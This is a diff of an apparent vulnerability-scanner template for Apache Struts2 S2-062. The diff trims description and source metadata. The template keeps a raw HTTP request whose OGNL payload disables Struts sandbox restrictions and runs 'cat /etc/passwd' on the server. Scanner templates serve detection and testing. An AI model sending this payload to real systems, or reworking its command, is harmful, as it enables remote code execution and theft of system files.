@@ -3,14 +3,8 @@ info:
   name: S2_062
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/is2tg05z5lu9mdn5
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: is2tg05z5lu9mdn5
-    fofa: 暂无
 http:
 - raw:
   - 'POST / HTTP/1.1
@@ -34,14 +28,10 @@ http:
     Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF
 
 
-
-
     ------WebKitFormBoundaryl7d1B1aGsV2wcZwF
 
 
     Content-Disposition: form-data; name="id"
-
-
 
 
     %{(#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0).(#request.map.setBean(#request.get(''struts.valueStack'')) == true).toString().substring(0,0).(#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0).(#request.map2.setBean(#request.get(''map'').get(''context'')) == true).toString().substring(0,0).(#request.map3=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0).(#request.map3.setBean(#request.get(''map2'').get(''memberAccess'')) == true).toString().substring(0,0).(#request.get(''map3'').put(''excludedPackageNames'',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0).(#request.get(''map3'').put(''excludedClasses'',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0).(#application.get(''org.apache.tomcat.InstanceManager'').newInstance(''freemarker.template.utility.Execute'').exec({''cat /etc/passwd''}))}
